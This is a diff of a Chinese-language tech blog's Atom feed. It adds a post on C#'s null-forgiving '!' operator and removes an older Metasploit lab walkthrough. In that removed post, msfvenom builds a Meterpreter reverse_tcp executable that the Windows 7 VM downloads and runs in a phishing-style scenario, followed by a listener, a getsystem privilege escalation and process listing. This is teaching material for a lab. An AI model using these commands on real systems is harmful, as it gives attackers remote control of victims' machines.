@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rainmakerho.github.io/"/>
-  <updated>2022-11-09T08:21:42.362Z</updated>
+  <updated>2022-11-10T09:46:23.805Z</updated>
   <id>https://rainmakerho.github.io/</id>
   
   <author>
@@ -15,6 +15,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>C# 使用 non-null 的運算子</title>
+    <link href="https://rainmakerho.github.io/2022/11/10/non-null-assertion-operator-syntax/"/>
+    <id>https://rainmakerho.github.io/2022/11/10/non-null-assertion-operator-syntax/</id>
+    <published>2022-11-10T09:16:39.000Z</published>
+    <updated>2022-11-10T09:46:23.805Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在寫 C# 時，有些關於 Null 的一些警告內容為 <strong>CS8600</strong> 或是 <strong>CS8602</strong> ，如下，<br>CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。<br>CS8602 // 可能 null 參考的取值 (dereference)。<br>從這些警告來看，筆著想到一個問題，<br>通常怕物件為 null ，怕會有 <strong>NullReferenceException</strong> 通常都會加上 <strong>?</strong> ，<br>那如果確定該物件不為 null 要加上什麼呢?</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>先回到 <strong>CS8600</strong> 或是 <strong>CS8602</strong> 的警告問題，<br>如果要讓警告消失的話，可以在程式碼的下、下去加入 <strong>停用</strong> CS8600 或是 CS8602 的標註，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">string</span> jsonString = <span class="string">@"&#123;""FirstName"":""RM"", ""LastName"":""Ho""&#125;"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。</span></span><br><span class="line"><span class="keyword">dynamic</span> customer2 = JsonSerializer.Deserialize&lt;ExpandoObject&gt;(jsonString);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。</span></span><br></pre></td></tr></table></figure><p>或是</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Foo</span>(<span class="params"><span class="keyword">string</span>? argument</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS8602 // 可能 null 參考的取值 (dereference)。</span></span><br><span class="line">    <span class="keyword">var</span> l = argument.Length;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS8602 // 可能 null 參考的取值 (dereference)。</span></span><br><span class="line">    <span class="keyword">var</span> l1 = argument?.Length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>當然，警告就是要讓開發人員去檢視是否真的會有 null 的問題，<br>所以相信很少人會真的去加 <strong>#pragma warning disable</strong> 。<br>那如果它真的不會是 null 在 C# 要加上什麼呢?<br>答案就是 <strong>!</strong> ，跟 TypeScript 一樣，都是 <strong>!</strong>，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">string</span> jsonString = <span class="string">@"&#123;""FirstName"":""RM"", ""LastName"":""Ho""&#125;"</span>;</span><br><span class="line"><span class="keyword">dynamic</span> customer2 = JsonSerializer.Deserialize&lt;ExpandoObject&gt;(jsonString)!;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Foo</span>(<span class="params"><span class="keyword">string</span>? argument</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> l = argument!.Length;</span><br><span class="line">    <span class="keyword">var</span> l1 = argument?.Length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://learntypescript.dev/07/l2-non-null-assertion-operator" target="_blank" rel="noopener">Using the non-null assertion operator</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在寫 C# 時，有些關於 Null 的一些警告內容為 &lt;strong&gt;CS8600&lt;/strong&gt; 或是 &lt;strong&gt;CS8602&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="C#" scheme="https://rainmakerho.github.io/tags/C/"/>
+    
+      <category term="NullReferenceException" scheme="https://rainmakerho.github.io/tags/NullReferenceException/"/>
+    
+      <category term="non-null" scheme="https://rainmakerho.github.io/tags/non-null/"/>
+    
+      <category term="!" scheme="https://rainmakerho.github.io/tags//"/>
+    
+      <category term="CS8600" scheme="https://rainmakerho.github.io/tags/CS8600/"/>
+    
+      <category term="CS8602" scheme="https://rainmakerho.github.io/tags/CS8602/"/>
+    
+  </entry>
   
   <entry>
     <title>AZ-305 考試經驗分享</title>
@@ -578,39 +611,6 @@
       <category term="DNS records" scheme="https://rainmakerho.github.io/tags/DNS-records/"/>
     
       <category term="IP addresses" scheme="https://rainmakerho.github.io/tags/IP-addresses/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Metasploit Framework - 遠端控制 Windows 電腦</title>
-    <link href="https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/"/>
-    <id>https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/</id>
-    <published>2022-06-23T03:21:33.000Z</published>
-    <updated>2022-06-23T07:12:46.747Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Metasploit Framework 是一個功能強大的資安工具組，<br>它將許多工具以Module的方式整合在一起，<br>而不用到到處去找、去下載不同的工具來做滲透測試。<br>正式開始學習之前先來淺嘗一下 Metasploit Framework 的強大之處。<br>練習情境為受害者收到釣魚信去下載惡意檔案並執行，<br>導致受害者的電腦(Windows 7)受到控制。</p><h3 id="練習"><a href="#練習" class="headerlink" title="練習"></a>練習</h3><p>開始之前，先準備一台 Windows 7(ip為10.5.0.5) 為受害VM，Ubuntu(版本為 20.04.4, ip為10.5.0.7) 安裝 Metasploit Framework。</p><p>1.安裝 <strong>Metasploit Framework</strong><br>依 <a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a> 說明來安裝。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">sudo chmod 755 msfinstall</span><br><span class="line">sudo ./msfinstall</span><br><span class="line">sudo msfconsole</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure></p><p>初始DB 及 設定 Web Service 的帳號及密碼 完成後，<br>執行 <code>db_status</code> 檢查 DB 是否有正常連線到 postgresql ([*] Connected to msf. Connection type: postgresql.)。<br>沒問題則執行 <code>exit</code> 離開 msfconsole</p><ul><li>註: 如果沒有設定 DB ，可以執行 <code>sudo msfdb init</code> 來設定 DB</li><li>註: 如果要重新設定 DB ，可以執行 <code>sudo msfdb reinit</code> 來重設 DB</li><li>註: 如果 postgresql 沒有啟動(postgresql selected, no connection)，可以執行 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo service postgresql start</span><br><span class="line">sudo msfconsole</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure></li></ul><p>2.建立 <strong>reverse_tcp</strong> 遠端控制執行檔<br>執行 <code>msfvenom</code> 來產生遠端控制執行檔，預設為 x86<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.7 -f exe -o ~/test.exe</span><br></pre></td></tr></table></figure></p><p>當使用者執行 <code>test.exe</code> 就會與 LHOST 建立連線</p><p>3.建立 <strong>http 網站</strong>來讓 Windows 7(ip為10.5.0.5) 下載<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></p><p>4.Windows 7(ip為10.5.0.5) 下載 <strong>test.exe</strong><br>Windows 7(ip為10.5.0.5) 開啟 IE 下載 test.exe<br><img src="/2022/06/23/metasploit-reverse-tcp/01.png" title="開啟 IE 下載 test.exe"></p><p>5.開啟 <strong>msfconsole</strong> 並設定 LHOST 及 RHOST<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">setg LHOST 10.5.0.7</span><br><span class="line">setg RHOST 10.5.0.5</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>全域設定 LHOST 為 Ubuntu(ip為10.5.0.7)，RHOST 為 Windows 7(ip為10.5.0.5)，<br>所以使用各項 Module 時，預設會使用此設定</p><p>6.使用 <strong>exploit/multi/handler</strong> 模組來監聽<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure></p><p>7.payload 使用 <strong>windows/meterpreter/reverse_tcp</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></p><p>8.查看<strong>設定值</strong>是否完整<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/02.png" title="show options"><p>在 payload 設定值中 Required 為 true 的參數都已有設定值</p><p>9.啟動<strong>監聽</strong>，並執行 test.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>並到 Windows 7 中執行 <code>test.exe</code><br><img src="/2022/06/23/metasploit-reverse-tcp/03.png" title="Meterpreter session opened"><br>這時，受害者電腦已與我們的Ubuntu 建立連線，<br>同時會進到了 meterpreter</p><p>10.執行 <code>getsystem</code> 來提升權限為 local administrator or SYSTEM<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/04.png" title="getsystem"><p>11.執行 <code>?</code> 來查看在 meterpreter 可以執行那些指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/05.png" title="meterpreter core commands"><p>12.執行 <code>ps</code> 來顯示 Windows 7 中執行的 Processes<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/06.png" title="ps command"><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a><br><a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md" target="_blank" rel="noopener">windows/meterpreter/reverse_tcp</a><br><a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/" target="_blank" rel="noopener">Meterpreter getsystem</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Metasploit Framework 是一個功能強大的資安工具組，&lt;br&gt;它將許多工具以Module的方式整合在一起，&lt;br&gt;而不用到到
-      
-    
-    </summary>
-    
-    
-      <category term="資安" scheme="https://rainmakerho.github.io/tags/%E8%B3%87%E5%AE%89/"/>
-    
-      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
-    
-      <category term="reverse_tcp" scheme="https://rainmakerho.github.io/tags/reverse-tcp/"/>
-    
-      <category term="msfvenom" scheme="https://rainmakerho.github.io/tags/msfvenom/"/>
-    
-      <category term="exploit/multi/handler" scheme="https://rainmakerho.github.io/tags/exploit-multi-handler/"/>
-    
-      <category term="msfconsole" scheme="https://rainmakerho.github.io/tags/msfconsole/"/>
     
   </entry>
   
